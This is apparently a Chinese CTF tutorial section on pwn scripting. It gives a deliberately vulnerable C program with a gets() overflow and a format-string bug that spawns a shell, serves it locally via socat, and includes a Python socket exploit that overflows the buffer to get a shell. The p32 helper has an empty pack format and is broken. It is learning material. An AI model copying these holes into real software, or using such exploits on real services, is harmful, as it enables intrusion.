# 3.使用Python脚本进行pwn 

## 远程发送payload

目标可执行文件源代码:

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

char sh[] = "/usr/bin/sh";

int init()
{
    setvbuf(stdin , 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
    return 0;
}

int func(char* cmd)
{
    system(cmd);
    return 0;
}

int main()
{
    char a[8] = { };
    char b[8] = { };
    puts("input: ");
    gets(a);
    printf(a);
    if (b[0] == 0x10) {
        func(sh);
    }
    return 0;
}
```

使用`socat tcp-l:8888,fork exec:./a.out,reuseaddr`指令部署题目, `nc 127.0.0.1 8888`可以接入连接

Python代码模板

```python
import socket
import telnetlib
import struct

def p32(val):
    # convert 32 bit int to little endian
    return struct.pack("", val)

def pwn():
    # create a tcp socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # connect the server and port
    s.connect(("127.0.0.1", 8888))
    # send payload
    payload = b'a' * 8 + b'\x10'
    s.sendall(payload + b'\n')

    # use telnet to connect
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

if __name__ == "__main__":
    pwn()
```

## pwntools库
